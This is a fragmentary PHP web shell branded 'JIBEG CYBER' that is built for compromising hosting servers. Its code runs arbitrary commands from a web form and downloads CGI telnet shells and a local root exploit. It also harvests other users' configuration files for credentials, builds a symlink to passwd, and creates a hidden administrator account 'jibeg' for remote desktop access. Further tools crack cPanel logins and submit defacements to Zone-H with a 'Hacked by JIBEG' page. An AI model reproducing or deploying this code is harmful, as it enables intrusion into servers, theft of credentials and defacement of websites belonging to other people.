...
$password = "33c95135d15d7426c7d1e57a6b1ec3b0";
...
function tools($toolsname, $args = null) {
	if($toolsname === "cmd") {
		print "<form method='post' action='?do=cmd&dir=".path()."' style='margin-top: 15px;'>
			  ...
			  <input style='border: none; border-bottom: 1px solid #555;' type='text' name='cmd' required>
			  <input style='border: none; border-bottom: 1px solid #555;' class='input' type='submit' value='>>'>
			  </form>";
	}
	...
	elseif($toolsname === "spawn") {
		if($args === "adminer") {
			if(file_exists("adminer.php")) {
				...
				if(getfile("adminer")) {
					...
					print color(1, 1, "Errors while downloading file Adminer.");
					@unlink("adminer.php");
				}
			}
		}
		...
		elseif($args === "cgitelnet1") {
			if(file_exists("jibeg_cgi/cgitelnet1.idx")) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/jibeg_cgi/cgitelnet1.idx' frameborder='0' scrolling='yes'></iframe>";
			}
			elseif(file_exists('cgitelnet1.idx')) {
				...
				if(!is_dir(path()."/jibeg_cgi/")) {
					@mkdir('jibeg_cgi', 0755);
					save("jibeg_cgi/.htaccess", "w", "AddHandler cgi-script .idx");
				}
				if(getfile("cgitelnet1")) {
					chmod('jibeg_cgi/cgitelnet1.idx', 0755);
					print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/jibeg_cgi/cgitelnet1.idx' frameborder='0' scrolling='yes'></iframe>";
				}
				else {
					print color(1, 1, "Error while downloading file CGI Telnet.");
					@rmdir(path()."/jibeg_cgi/");
					if(!@rmdir(path()."/jibeg_cgi/") AND OS() === "Linux") @exe("rm -rf ".path()."/jibeg_cgi/");
					if(!@rmdir(path()."/jibeg_cgi/") AND OS() === "Windows") @exe("rmdir /s /q ".path()."/jibeg_cgi/");
				}
			}
	
		}
		elseif($args === "cgitelnet2") {
			if(file_exists("jibeg_cgi/cgitelnet2.idx")) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/jibeg_cgi/cgitelnet2.idx' frameborder='0' scrolling='yes'></iframe>";
			}
			elseif(file_exists('cgitelnet2.idx')) {
				...
				if(getfile("cgitelnet2")) {
					chmod('jibeg_cgi/cgitelnet2.idx', 0755);
					print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/jibeg_cgi/cgitelnet2.idx' frameborder='0' scrolling='yes'></iframe>";
				}
				else {
					print color(1, 1, "Error while downloading file CGI Telnet.");
	...
	elseif($toolsname === "jibeg_config") {
		if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'jibeg_config'."));
		if(!is_dir(path()."/jibeg_config/")) {
			@mkdir('jibeg_config', 0755);
			$htaccess = "Options all\nDirectoryIndex indoxploit.htm\nSatisfy Any";
			save("jibeg_config/.htaccess","w", $htaccess);
				...
				if(is_readable($user_docroot)) {
					...
					foreach($getconfig as $config => $userconfig) {
						...
						if($get == '') {
							...
							$fopen = fopen("jibeg_config/$user-$userconfig.txt", "w");
							fputs($fopen, $get);
						}
					}
				}
		...
		print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/jibeg_config/' frameborder='0' scrolling='yes'><iframe>";
		print "</div>";
	}
	elseif($toolsname === "symlink") {
		if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'jibeg_sym'."));
		if(!is_dir(path()."/jibeg_sym/")) {
			...
			@unlink("passwd.txt");
			@unlink("jibeg_sym/pas.txt");
			@unlink("jibeg_sym/nemu.txt");
		}

		print "<div style='background: #ffffff; width: 100%; height: 100%'>";
		print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/jibeg_sym/' frameborder='0' scrolling='yes'></iframe>";
		print "</div>";
	}
	...
	elseif($toolsname === "krdp") {
		...
		if(preg_match("/jibeg/", exe("net user"))) die(color(1, 1, "[INFO] username 'jibeg' already exists."));

		$add_user   = exe("net user jibeg jibeg /add");
    	$add_groups1 = exe("net localgroup Administrators jibeg /add");
    	$add_groups2 = exe("net localgroup Administrator jibeg /add");
    	$add_groups3 = exe("net localgroup Administrateur jibeg /add");

    	print "[ RDP ACCOUNT INFO ]<br>
    	------------------------------<br>
    	IP: ".color(1, 2, $GLOBALS['SERVERIP'])."<br>
    	Username: ".color(1, 2, "jibeg")."<br>
    	Password: ".color(1, 2, "jibeg")."<br>
    	------------------------------<br><br>
    	[ STATUS ]<br>
    	------------------------------<br>
    	";
...
function files_and_folder() {
	...
	print "</table>";
	print "<center>Copyright &copy; ".date("Y")." - <a href='http://jibeg.co.de/' target='_blank'>".color(1, 2, "JIBEG CYBER")."</a></center>";
}
	...
	if(isset($_GET['do'])) {
		if($_GET['do'] === "cmd") {
			if(isset($_POST['cmd'])) {
				...
				elseif(preg_match("/^jibeg_config$/", $_POST['cmd'])) {
					tools("jibeg_config");
				}
		...
		elseif($_GET['do'] === "zoneh") {
			if(isset($_POST['submit']) AND $_GET['do'] === "zoneh") {
				...
				print "<center><form method='post' action='?do=zoneh&dir=".path()."'>
		    	       Defacer: <br>
		    	       <input type='text' name='nick' size='50' value='jibeg'><br><br>
		    	       Domains: <br>
		...
		elseif($_GET['do'] == 'cpanel') {
			if($_POST['crack']) {
				...
				print ($i === 0) ? "" : "<p>".color(1, 3, "Sukses nyolong $i Cpanel by jibeg")."</p>";
			} else {
				print "<center>
				...
				print "</textarea><br>
					   ...
					   <input style='width: 425px; background: transparent; border: 1px solid #ffffff; color: #ffffff;' type='text' name='linkpass' placeholder='http://web.com/jibeg_config/'>
		...
		elseif($_GET['do'] == 'fakeroot') {
			...
			if($_POST['reverse']) {
				...
				print "</textarea><br>
				<font style='text-decoration: underline;'>Index File:</font><br>
				<textarea name='script' style='width: 450px; height: 200px;'>Hacked by JIBEG</textarea><br>
		...
		elseif($_GET['do'] === 'lre') {
			if(file_exists("jibeg.php")) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/jibeg.php' frameborder='0' scrolling='yes'></iframe>";
			}
			else {
				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create file 'JIBEG'."));
				if(getfile("LRE")) {
					print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/jibeg.php' frameborder='0' scrolling='yes'></iframe>";
				}
				else {
					print color(1, 1, "Error while downloading file jibeg.");
					@unlink("jibeg.php");
				}
			}
